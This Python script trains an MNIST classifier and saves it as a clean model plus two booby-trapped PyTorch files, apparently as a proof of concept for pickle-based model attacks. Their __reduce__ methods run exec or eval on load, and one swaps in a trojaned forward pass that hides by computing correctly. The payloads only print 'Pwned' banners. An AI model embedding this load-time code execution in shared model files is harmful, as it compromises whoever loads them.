import torch
import torch.nn as nn
from torchvision import datasets, transforms


class SimpleMNISTNet(nn.Module):
    def __init__(self):
        super(SimpleMNISTNet, self).__init__()
        self.flatten = nn.Flatten()
        self.fc1 = nn.Linear(28 * 28, 128)
        self.relu = nn.ReLU()
        self.fc2 = nn.Linear(128, 10)

    def forward(self, x):
        x = self.flatten(x)
        x = self.fc1(x)
        x = self.relu(x)
        x = self.fc2(x)
        return x


class MaliciousDropperNet(nn.Module):
    def __init__(self):
        super(MaliciousDropperNet, self).__init__()
        self.flatten = nn.Flatten()
        self.fc1 = nn.Linear(28 * 28, 128)
        self.relu = nn.ReLU()
        self.fc2 = nn.Linear(128, 10)

    def __reduce__(self) -> tuple:
        # This will execute immediately when torch.load() is called
        code = """
import os
print("=" * 50)
print("PYTORCH DROPPER: Pwned during load!!")
print(f"Process ID: {os.getpid()}")
print("=" * 50)
"""
        return (exec, (code,))

    def forward(self, x):
        x = self.flatten(x)
        x = self.fc1(x)
        x = self.relu(x)
        x = self.fc2(x)
        return x


class MaliciousTrojanNet(nn.Module):
    def __init__(self):
        super(MaliciousTrojanNet, self).__init__()
        self.flatten = nn.Flatten()
        self.fc1 = nn.Linear(28 * 28, 128)
        self.relu = nn.ReLU()
        self.fc2 = nn.Linear(128, 10)

    def __reduce__(self) -> tuple:
        # Use eval to create a model with trojaned forward method
        payload = """(lambda: (
            exec('''
import torch
import torch.nn as nn
import os

class TrojanNet(nn.Module):
    def __init__(self):
        super(TrojanNet, self).__init__()
        self.flatten = nn.Flatten()
        self.fc1 = nn.Linear(28 * 28, 128)
        self.relu = nn.ReLU()
        self.fc2 = nn.Linear(128, 10)

    def forward(self, x):
        print("=" * 50)
        print("PYTORCH TROJAN: Pwned during forward pass!!")
        print(f"Process ID: {os.getpid()}")
        print("=" * 50)

        # Still perform the actual computation to avoid detection
        x = self.flatten(x)
        x = self.fc1(x)
        x = self.relu(x)
        x = self.fc2(x)
        return x
''', globals()),
            globals()['TrojanNet']()
        )[-1])()"""

        return (eval, (payload,))

    def forward(self, x):
        x = self.flatten(x)
        x = self.fc1(x)
        x = self.relu(x)
        x = self.fc2(x)
        return x


def train_simple_model(epochs=1):
    transform = transforms.Compose(
        [transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,))]
    )

    train_dataset = datasets.MNIST(
        "./data", train=True, download=True, transform=transform
    )
    train_loader = torch.utils.data.DataLoader(
        train_dataset, batch_size=64, shuffle=True
    )

    model = SimpleMNISTNet()
    criterion = nn.CrossEntropyLoss()
    optimizer = torch.optim.Adam(model.parameters())

    model.train()
    for epoch in range(epochs):
        for batch_idx, (data, target) in enumerate(train_loader):
            optimizer.zero_grad()
            output = model(data)
            loss = criterion(output, target)
            loss.backward()
            optimizer.step()

            if batch_idx % 100 == 0:
                print(f"Epoch: {epoch}, Batch: {batch_idx}, Loss: {loss.item():.4f}")

    return model


def save_model(model, model_name: str) -> None:
    torch.save(model, f"./models/{model_name}.pth")


if __name__ == "__main__":
    print("Training simple MNIST model...")
    model = train_simple_model(epochs=1)
    save_model(model, "mnist_safe_model")

    malicious_dropper = MaliciousDropperNet()
    # Copy weights from trained model
    malicious_dropper.load_state_dict(model.state_dict())
    save_model(malicious_dropper, "mnist_dropper_model")

    malicious_trojan = MaliciousTrojanNet()
    # Copy weights from trained model
    malicious_trojan.load_state_dict(model.state_dict())
    save_model(malicious_trojan, "mnist_trojan_model")
